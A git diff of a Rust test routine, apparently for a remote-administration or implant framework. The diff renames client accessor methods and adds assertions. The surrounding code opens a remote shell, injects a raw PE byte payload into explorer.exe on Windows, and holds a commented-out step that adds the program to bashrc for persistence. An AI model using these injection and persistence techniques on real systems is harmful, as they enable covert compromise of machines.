@@ -13,9 +13,9 @@ use tokio::sync::RwLock;
 
 pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
     let lock_obj = server.read().await;
-    let client = lock_obj.get_client()?;
-    let file_agent = client.get_fs_agent().await?;
-    let process_agent = client.get_process_agent().await?;
+    let client = lock_obj.client()?;
+    let file_agent = client.fs_agent().await?;
+    let process_agent = client.process_agent().await?;
 
     client.ping().await?;
     info!("version: {}", client.version().await?);
@@ -33,8 +33,8 @@ pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
     let mut stdin_tx = stdin_tx.into_inner().await?;
     let mut stdout_rx = stdout_rx.into_inner().await?;
     stdin_tx.send("echo hello\n".into()).await?;
-    info!(
-        "echo hello: {}",
+    assert_eq!(
+        "hello\n",
         String::from_utf8_lossy(
             stdout_rx
                 .recv()
@@ -45,15 +45,15 @@ pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
     );
 
     let platform = client.target_platform().await?;
+    let shell = client.shell().await?;
     info!("target platform: {:?}", platform);
+    info!("target shell: {:?}", shell);
 
     if platform == TargetPlatform::Windows {
         info!("injecting shellcode into explorer.exe");
         process_agent
             .inject_shellcode_by_id(
-                process_agent
-                    .get_id_by_name("explorer.exe".to_string())
-                    .await?,
+                process_agent.id_by_name("explorer.exe".to_string()).await?,
                 vec![
                     0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xff,
                     0xff, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
@@ -181,11 +181,15 @@ pub async fn run(server: Arc<RwLock<ServerObj>>) -> Result<()> {
             .await?;
     }
 
-    if platform != TargetPlatform::General {
-        let autorun_agent = client.get_autorun_agent().await?;
-        info!("adding current exe to bashrc");
-        autorun_agent.add_current_user().await?;
-    }
+    // if platform != TargetPlatform::General {
+    //     let autorun_agent = client.autorun_agent().await?;
+    //     info!("adding current exe to bashrc");
+    //     autorun_agent.add_current_user().await?;
+    //     info!("checking result");
+    //     assert_eq!(autorun_agent.exist_current_user().await?, true);
+    //     info!("removing autorun");
+    //     autorun_agent.remove_current_user().await?;
+    // }
 
     Ok(())
 }
